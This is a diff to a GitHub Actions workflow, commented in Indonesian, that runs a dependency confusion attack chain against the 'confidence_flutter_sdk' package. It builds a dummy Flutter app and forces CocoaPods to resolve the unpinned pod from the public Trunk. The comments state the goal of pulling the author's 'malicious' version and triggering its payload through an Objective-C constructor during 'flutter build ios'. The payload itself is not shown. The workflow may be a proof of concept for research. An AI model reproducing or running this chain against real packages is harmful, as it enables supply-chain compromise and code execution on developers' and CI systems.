@@ -10,27 +10,30 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Full RCE Chain
+      - name: Execute Full RCE Chain (Public Registry Resolve)
         run: |
-          # 0. NUCLEAR RESET: Hapus folder project lama biar gak ada cache zombie
+          # 0. NUCLEAR RESET
           rm -rf rce_test
           
           # 1. Create fresh dummy project
           flutter create rce_test
           cd rce_test
+          
+          # Paksa tambahkan dependency tanpa versi spesifik agar resolve ke versi tertinggi di Trunk
           flutter pub add confidence_flutter_sdk
           
           # 2. Patch Platform Version ke 16.0
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
           
-          # 3. DIRECT GIT BYPASS (The Guerilla Route)
-          # Bunuh logic otomatis Flutter agar tidak terkunci ke symlink lokal
+          # 3. NATIVE RESOLUTION (The Dependency Confusion Route)
+          # Hapus logic otomatis Flutter yang seringkali mengunci ke path lokal/symlink
           sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
           
-          # PAKSA ambil dari branch main. Bodo amat sama CDN Trunk yang lemot!
-          echo "pod 'confidence_flutter_sdk', :git => 'https://github.com/ilhamal7/confidence-sdk-flutter.git', :branch => 'main'" >> ios/Podfile
+          # Tambahkan pod secara eksplisit tanpa :git. 
+          # CocoaPods akan mencari ke Master Repo / Trunk secara otomatis.
+          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
           
-          echo "=== Podfile AFTER Guerilla Patch (Direct Git) ==="
+          echo "=== Podfile AFTER Native Patch (Dependency Confusion Mode) ==="
           cat ios/Podfile
           
           cd ios
@@ -40,17 +43,19 @@ jobs:
           rm -rf Pods
           rm -rf Podfile.lock
           
-          # Jalankan install secara verbose untuk debugging
+          # Update repo untuk memastikan versi 'malicious' lu terdeteksi
+          pod repo update
+          
+          # Jalankan install secara verbose
           pod install --verbose 2>&1 | tee pod_install.log || true
           
           echo "=== Check Podfile.lock Status ==="
-          # Jika gagal di sini, cek pod_install.log untuk error spesifik dari CocoaPods
-          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING - CHECK LOGS ABOVE"
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE 2.0.0"
+          # Verifikasi apakah dia narik versi lu (v2.0.0 atau v1.1.2) dari Trunk
+          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING"
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE FROM TRUNK"
           
           cd ..
-          # 5. Build Phase - Execution Phase (Trigger Payload)
-          # dyld akan load library dan mentrigger Objective-C constructor lu
+          # 5. Build Phase - Execution Phase (Trigger Payload via Objective-C Constructor)
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
           echo "=== Build log tail ==="
